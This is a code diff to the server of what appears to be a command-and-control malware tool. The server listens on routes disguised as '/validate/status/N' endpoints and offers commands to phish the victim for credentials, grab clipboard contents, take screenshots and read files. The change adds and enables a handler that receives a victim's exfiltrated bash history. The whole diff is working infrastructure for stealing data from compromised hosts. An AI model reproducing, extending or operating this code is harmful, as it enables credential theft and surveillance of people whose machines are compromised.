@@ -65,7 +65,7 @@ async def CheckIn(request):
             print("")
             print("\n ---> COMMANDS <---\n\n")
             print(" > prompt : Prompt the user to enter credentials\n")
-            print(" > userhist : Grep for interesting hosts from bash history\n")
+            print(" > userhist : List the user's bash history\n")
             print(" > clipboard : Grab text in the user's clipboard\n")
             print(" > connections : Show active network connections\n")
             print(" > screenshot : Grap a screenshot of the host\n")
@@ -336,6 +336,16 @@ async def Prompt(request):
     return web.Response(text=text)
 
 
+async def UserHist(request):
+
+    userHistData = await request.read()
+    userHistData = str(userHistData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
+    timestmp = datetime.now()
+    print("\n\n Timestamp: %s" % str(timestmp))
+    print(" [+] User's bash history: \n")
+    print("%s" % str(userHistData))
+    text = 'OK'
+    return web.Response(text=text)
 
 
 # Create a web application
@@ -362,7 +372,7 @@ app.add_routes([
     web.post('/validate/status/8', ConnData),
     web.post('/validate/status/9', IpConfig),
     web.post('/validate/status/10', ListUsers),
-    #web.post('/validate/status/11', UserHist),
+    web.post('/validate/status/11', UserHist),
     web.post('/validate/status/13', Whoami),
     web.post('/validate/status/14', SysInfo),
     web.post('/validate/status/15', CatFile),
